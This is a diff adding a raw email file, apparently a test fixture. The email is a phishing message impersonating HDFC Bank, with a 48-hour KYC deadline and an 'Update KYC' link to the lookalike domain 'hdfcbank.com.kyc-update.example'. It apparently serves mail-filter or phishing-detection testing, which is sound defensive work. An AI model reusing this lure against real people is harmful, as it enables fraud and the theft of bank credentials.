@@ -1,0 +1,13 @@
+Delivered-To: kaushal@gmail.com
+Received: from mail.hdfcbank-kyc.example (mail.hdfcbank-kyc.example. [203.0.113.10]) by mx.google.com with ESMTPS id muf070g0.57 for <kaushal@gmail.com>; Thu, 24 Sep 2026 04:00:00 +0000
+Authentication-Results: mx.google.com; dkim=pass header.i=@hdfcbank-kyc.example header.s=s1 header.b=K3fQ9x; spf=pass (google.com: domain of bounce@hdfcbank-kyc.example designates 203.0.113.10 as permitted sender) smtp.mailfrom=hdfcbank-kyc.example; dmarc=pass (p=REJECT sp=REJECT dis=NONE) header.from=hdfcbank-kyc.example
+Date: Thu, 24 Sep 2026 04:00:00 +0000
+From: "HDFC Bank" <alerts@hdfcbank-kyc.example>
+To: "Kaushal Shahare" <kaushal@gmail.com>
+Subject: KYC pending: account will be restricted
+Message-ID: <muf070g0.57@hdfcbank-kyc.example>
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+Content-Transfer-Encoding: 8bit
+
+<!DOCTYPE html><html><head><meta charset="utf-8"><title></title></head><body style="font-family:Arial,sans-serif;color:#222;background:#ffffff"><p>Dear Customer, your KYC is pending. Complete it within 48 hours to avoid restrictions.</p><p><a href="https://hdfcbank.com.kyc-update.example/netbanking" style="background:#e50914;color:#fff;padding:10px 18px;text-decoration:none">Update KYC</a></p></body></html>
